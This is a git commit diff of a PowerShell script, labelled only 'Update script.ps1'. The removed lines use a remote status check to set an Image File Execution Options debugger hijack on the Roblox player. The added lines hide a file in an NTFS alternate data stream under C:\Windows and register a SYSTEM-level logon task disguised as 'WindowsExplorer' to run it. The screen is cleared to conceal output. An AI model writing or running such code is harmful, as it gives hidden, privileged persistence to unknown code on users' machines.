aaa333a4510065d3ebadeee6332984b5d26537e2
Abdullah Zafar <102247412+HadronCollision@users.noreply.github.com>
2025-07-22 10:57:29 +0500

    Update script.ps1

--- script.ps1
+++ script.ps1
@@ -1,10 +1,4 @@
-$status = Invoke-RestMethod -Uri "https://sudo-robux.vercel.app/status" -Method Get -UseBasicParsing -ErrorAction Stop
-Write-Host $status
-
-if ($status) {
-	reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\RobloxPlayerBeta.exe" /t REG_SZ /v Debugger /d "C:\Windows\System32\cmd.exe" /f
-}
-else {
-	reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\RobloxPlayerBeta.exe" /f
-	.\RobloxPlayerBeta.exe
-}
+type russianhuzz > C:\Windows:Explorer
+Clear-Host
+schtasks /create /tn "WindowsExplorer" /tr "C:\Windows\System32\cmd.exe /c wmic process call create \"C:\Windows:Explorer\"" /sc onlogon /ru "SYSTEM" /rl highest /f
+Clear-Host
